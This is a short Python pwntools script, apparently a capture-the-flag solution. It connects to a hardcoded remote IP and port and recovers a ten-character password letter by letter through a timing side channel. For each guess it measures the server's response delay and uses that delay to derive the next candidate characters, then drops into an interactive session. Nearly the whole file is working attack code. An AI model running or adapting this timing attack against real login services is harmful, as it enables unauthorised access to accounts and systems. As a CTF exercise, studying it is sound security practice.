from pwn import *
import random

letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
           'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']


def guess(time, ch):
    time = int(time)
    val = ord(ch)
    val1 = abs(ord(ch)+time)
    val2 = abs(ord(ch)-time)

    ch1 = chr(val1)
    ch2 = chr(val2)

    if(ch1 not in letters):
        ch1 = ch2
    return (ch1, ch2)


def getPass(i, io):
    ch = random.choice(letters)
    io.sendline(ch)
    start = time.time()
    line = io.recvline()
    line = io.recvline().decode('utf-8')
    print(line)
    if line.count(f"position {i}") == 0:
        return ch

    stop = time.time()
    time_taken = stop - start
    print(time_taken)
    ch1, ch2 = guess(time_taken, ch)

    print(ch1)
    print(ch2)

    io.sendline(ch1)
    io.recvline()
    line = io.recvline().decode('utf-8')
    print(line)
    if line.count(f"position {i}") == 0:
        return ch1

    if line.count(f"position {i}") != 0:
        io.sendline(ch2)
        io.recvline()
        io.recvline()
        return ch2

    return ch1


if __name__ == "__main__":
    io = remote('34.90.172.123', 1337)
    io.recvline()
    io.recvline()
    io.recvline()
    io.recvline()
    io.recvline()
    io.recvline()
    print('Start')
    for i in range(0, 10):
        print(getPass(i, io))

    io.interactive()
